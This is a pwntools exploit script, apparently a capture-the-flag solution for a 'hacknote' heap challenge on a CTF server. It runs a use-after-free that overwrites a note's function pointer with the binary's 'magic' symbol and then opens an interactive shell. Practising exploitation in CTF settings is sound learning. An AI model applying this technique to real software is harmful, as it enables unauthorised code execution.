from pwn import *
LOCAL = False
binary = './hacknote'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10137)

context.arch = 'amd64'
elf = ELF(binary)

def add(size, content):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Note size :')
    r.sendline(str(size))
    r.recvuntil('Content :')
    r.sendline(content)

def delete(index):
    r.recvuntil('Your choice :')
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(index))

def print_note(index):
    r.recvuntil('Your choice :')
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(index))

def quit():
    r.recvuntil('Your choice :')
    r.sendline('4')

pause()
add(32, 'asdf')
add(32, 'asdf')
delete(1)
delete(0)
add(16, p64(elf.symbols['magic']))
print_note(1)

#r.sendline('cat /home/`whoami`/flag')
r.interactive()
